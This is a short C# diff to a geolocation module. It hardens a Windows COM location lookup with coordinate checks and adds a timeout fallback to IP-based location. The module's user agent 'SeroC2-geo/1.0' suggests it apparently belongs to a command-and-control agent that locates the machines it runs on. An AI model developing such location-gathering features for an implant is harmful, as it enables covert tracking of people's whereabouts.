@@ -42,7 +42,7 @@ internal static class GeoFeature
     private static readonly HttpClient _http = new()
     {
         Timeout = TimeSpan.FromSeconds(8),
-        DefaultRequestHeaders = { { "User-Agent", "Mozilla/5.0" } }
+        DefaultRequestHeaders = { { "User-Agent", "SeroC2-geo/1.0" } }
     };
 
     internal static async Task<string> GetLocationAsync()
@@ -87,7 +87,10 @@ internal static class GeoFeature
                                     bool lonOk = Marshal.GetDelegateForFunctionPointer<GetLongitudeDelegate>  (Vtbl(pLL, 7))(pLL, out lon) == 0;
                                     Marshal.GetDelegateForFunctionPointer<GetErrorRadiusDelegate>(Vtbl(pLL, 8))(pLL, out acc);
                                     Marshal.Release(pLL);
-                                    ok = latOk && lonOk;
+                                    ok = latOk && lonOk
+                                         && !(lat == 0.0 && lon == 0.0)
+                                         && lat >= -90.0 && lat <= 90.0
+                                         && lon >= -180.0 && lon <= 180.0;
                                 }
                                 Marshal.Release(pRep);
                             }
@@ -105,7 +108,16 @@ internal static class GeoFeature
             }) { IsBackground = true };
             thread.Start();
 
-            var (lat, lon, acc, gotFix, errMsg) = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(20));
+            (double lat, double lon, double acc, bool gotFix, string errMsg) comResult;
+            try
+            {
+                comResult = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(20));
+            }
+            catch (TimeoutException)
+            {
+                return await GetLocationByIpAsync("COM location timed out");
+            }
+            var (lat, lon, acc, gotFix, errMsg) = comResult;
             if (!gotFix) return await GetLocationByIpAsync(errMsg);
 
             string city = "", region = "", country = "";
